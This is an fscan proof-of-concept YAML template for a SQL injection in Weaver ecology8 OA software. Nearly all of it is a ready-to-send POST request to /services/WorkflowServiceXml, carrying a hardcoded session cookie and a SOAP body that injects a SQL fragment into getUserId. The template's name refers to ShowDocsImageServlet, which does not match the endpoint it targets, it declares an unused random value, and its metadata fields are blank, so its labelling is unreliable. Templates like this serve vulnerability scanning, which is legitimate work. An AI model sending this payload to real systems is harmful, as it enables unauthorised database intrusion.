fscan-poc/fscan-ecology8-ShowDocsImageServlet-sqli.yml

name: ecology8-ShowDocsImageServlet-sqli
set:
  s1: randomInt(1000,9999)
groups:
  poc:  
    - method: POST
      path: /services/WorkflowServiceXml
      follow_redirects: false
      headers:
        Cookie: ecology_JSessionid=aaaBARi23vekqguNfrVDy
        Content-Type: text/xml;charset=UTF-8
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
      body: |
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
          <soapenv:Header/>
          <soapenv:Body>
            <web:getUserId>
          <web:string>loginId = ? ;*--</web:string>
        <web:string>xx</web:string>
            </web:getUserId>
          </soapenv:Body>
        </soapenv:Envelope>
      expression: >-
        response.status == 200 && response.content_type.contains("xml")

detail: 
  links: 
  authors:
  